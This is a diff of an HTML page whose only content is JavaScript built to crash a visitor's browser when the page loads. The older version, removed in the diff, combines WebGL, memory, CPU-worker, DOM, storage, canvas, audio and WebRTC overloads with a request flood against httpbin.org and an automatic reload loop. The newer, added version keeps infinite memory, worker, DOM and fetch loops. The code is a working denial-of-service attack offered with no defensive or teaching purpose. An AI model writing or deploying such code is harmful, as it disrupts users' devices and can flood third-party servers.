@@ -1,179 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CRASH SYSTEM</title>
+    <title>Crash Instantâneo</title>
 </head>
 <body>
     <script>
-        // 1. WebGL OVERLOAD
-        function crashWebGL() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (!gl) return;
-            
-            // 10M pontos
-            const vertices = new Float32Array(10000000);
-            const buffer = gl.createBuffer();
-            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-            gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
-            
-            // 100 texturas 16K
-            for (let i = 0; i < 100; i++) {
-                const texture = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, texture);
-                const size = 16384;
-                const data = new Uint8Array(size * size * 4);
-                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, data);
+        // 1. Loop infinito de alocação de memória
+        function memoryCrash() {
+            while (true) {
+                const arr = new Array(1000000).fill(new Float32Array(1000));
             }
-            
-            // Loop infinito de draw calls
-            function drawLoop() {
+        }
+
+        // 2. Workers para sobrecarregar CPU
+        function cpuCrash() {
+            const blob = new Blob(['while(true){for(let i=0;i<1000000;i++){Math.sin(i);}}'], { type: 'text/javascript' });
+            const url = URL.createObjectURL(blob);
+            for (let i = 0; i < 1000; i++) {
+                new Worker(url);
+            }
+        }
+
+        // 3. Sobrecarga DOM
+        function domCrash() {
+            while (true) {
                 for (let i = 0; i < 1000; i++) {
-                    gl.drawArrays(gl.POINTS, 0, 10000000);
-                }
-                requestAnimationFrame(drawLoop);
-            }
-            drawLoop();
-        }
-
-        // 2. MEMORY BOMB
-        function crashMemory() {
-            setInterval(() => {
-                const arrays = [];
-                for (let i = 0; i < 1000; i++) {
-                    arrays.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB cada
-                }
-            }, 0);
-        }
-
-        // 3. CPU FORK BOMB
-        function crashCPU() {
-            function spawnWorker() {
-                const blob = new Blob([
-                    `self.onmessage = function() {
-                        while(true) {
-                            for(let i=0;i<10000000;i++) {
-                                Math.sqrt(Math.random());
-                            }
-                        }
-                    }`
-                ], { type: 'application/javascript' });
-                
-                const worker = new Worker(URL.createObjectURL(blob));
-                worker.postMessage('start');
-                setTimeout(() => spawnWorker(), 1);
-            }
-            
-            // Inicia múltiplos workers
-            for (let i = 0; i < navigator.hardwareConcurrency * 2; i++) {
-                spawnWorker();
-            }
-        }
-
-        // 4. DOM SPAM
-        function crashDOM() {
-            setInterval(() => {
-                for (let i = 0; i < 10000; i++) {
                     const div = document.createElement('div');
-                    div.innerHTML = 'x'.repeat(1000000);
+                    div.style.width = '100px';
+                    div.style.height = '100px';
                     document.body.appendChild(div);
                 }
-            }, 0);
-        }
-
-        // 5. NETWORK FLOOD
-        function crashNetwork() {
-            const urls = [
-                'https://httpbin.org/delay/1',
-                'https://httpbin.org/status/200',
-                'https://httpbin.org/uuid'
-            ];
-            
-            setInterval(() => {
-                for (let i = 0; i < 100; i++) {
-                    fetch(urls[i % urls.length], { 
-                        mode: 'no-cors',
-                        cache: 'no-cache',
-                        keepalive: true
-                    }).catch(() => {});
-                }
-            }, 0);
-        }
-
-        // 6. STORAGE FILL
-        function crashStorage() {
-            try {
-                const data = 'x'.repeat(1024 * 1024);
-                while (true) {
-                    localStorage.setItem('crash' + Math.random(), data);
-                    sessionStorage.setItem('crash' + Math.random(), data);
-                }
-            } catch(e) {}
-        }
-
-        // 7. EVENT LOOP BLOCK
-        function crashEventLoop() {
-            while(true) {
-                Promise.resolve().then(() => {});
-                setTimeout(() => {}, 0);
-                requestAnimationFrame(() => {});
             }
         }
 
-        // 8. CANVAS BOMB
-        function crashCanvas() {
-            for (let i = 0; i < 100; i++) {
-                const canvas = document.createElement('canvas');
-                canvas.width = 32768;
-                canvas.height = 32768;
-                const ctx = canvas.getContext('2d');
-                ctx.fillStyle = 'black';
-                ctx.fillRect(0, 0, 32768, 32768);
-                document.body.appendChild(canvas);
+        // 4. Requisições de rede simultâneas
+        function networkCrash() {
+            while (true) {
+                fetch('https://example.com', { mode: 'no-cors' }).catch(() => {});
             }
         }
 
-        // 9. AUDIO CONTEXT OVERLOAD
-        function crashAudio() {
-            try {
-                for (let i = 0; i < 100; i++) {
-                    const audioContext = new AudioContext();
-                    const oscillator = audioContext.createOscillator();
-                    oscillator.connect(audioContext.destination);
-                    oscillator.start();
-                }
-            } catch(e) {}
-        }
-
-        // 10. WEBRTC FLOOD
-        function crashWebRTC() {
-            try {
-                for (let i = 0; i < 50; i++) {
-                    const pc = new RTCPeerConnection();
-                    pc.createDataChannel('crash');
-                    pc.createOffer().catch(() => {});
-                }
-            } catch(e) {}
-        }
-
-        // EXECUTAR TUDO SIMULTANEAMENTE
-        crashWebGL();
-        crashMemory();
-        crashCPU();
-        crashDOM();
-        crashNetwork();
-        crashStorage();
-        crashCanvas();
-        crashAudio();
-        crashWebRTC();
-        
-        // Event loop block por último
-        setTimeout(crashEventLoop, 100);
-        
-        // Loop adicional para garantir
-        setInterval(() => {
-            location.reload();
-        }, 5000);
+        // Executar tudo simultaneamente
+        memoryCrash();
+        cpuCrash();
+        domCrash();
+        networkCrash();
     </script>
 </body>
 </html>
